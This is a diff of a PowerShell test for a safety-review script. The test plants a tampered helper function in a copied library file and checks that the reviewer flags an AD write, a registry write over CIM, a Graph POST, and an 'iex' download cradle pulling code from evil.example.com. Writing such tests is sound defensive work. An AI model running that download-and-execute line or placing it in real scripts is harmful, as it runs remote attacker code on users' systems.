 $tamper = Join-Path $tmp 'tampered'; New-Item -ItemType Directory -Force (Join-Path $tamper 'lib') | Out-Null
 Copy-Item (Join-Path $root '*.ps1') $tamper; Copy-Item (Join-Path $root 'lib\*.ps1') (Join-Path $tamper 'lib')
-Add-Content (Join-Path $tamper 'lib\Common.ps1') "`nfunction Invoke-Helper { Set-ADUser -Identity x -Description y; iex (New-Object Net.WebClient).DownloadString('http://evil.example.com/p'); Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/users' }"
+Add-Content (Join-Path $tamper 'lib\Common.ps1') "`nfunction Invoke-Helper { Set-ADUser -Identity x -Description y; iex (New-Object Net.WebClient).DownloadString('http://evil.example.com/p'); Invoke-MgGraphRequest -Method POST -Uri 'https://graph.microsoft.com/v1.0/users'; Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{} }"
 $tamperOut = & (Join-Path $tamper 'Test-IDWolfSafety.ps1') -Quiet 6>&1 2>&1 | Out-String
 $tamperExit = $LASTEXITCODE
-Assert-True ($tamperExit -eq 1 -and $tamperOut -match 'Set-ADUser changes the directory' -and $tamperOut -match 'iex is not allowed' -and $tamperOut -match 'evil\.example\.com' -and $tamperOut -match 'not a GET') 'safety review catches an AD write, iex, a download and a Graph POST'
+Assert-True ($tamperExit -eq 1 -and $tamperOut -match 'Set-ADUser changes the directory' -and $tamperOut -match 'iex is not allowed' -and $tamperOut -match 'evil\.example\.com' -and $tamperOut -match 'not a GET' -and $tamperOut -match 'not a registry read') 'safety review catches an AD write, iex, a download, a Graph POST and a registry write over CIM'
 
 Remove-Item -Recurse -Force $tmp
 Write-Host ""
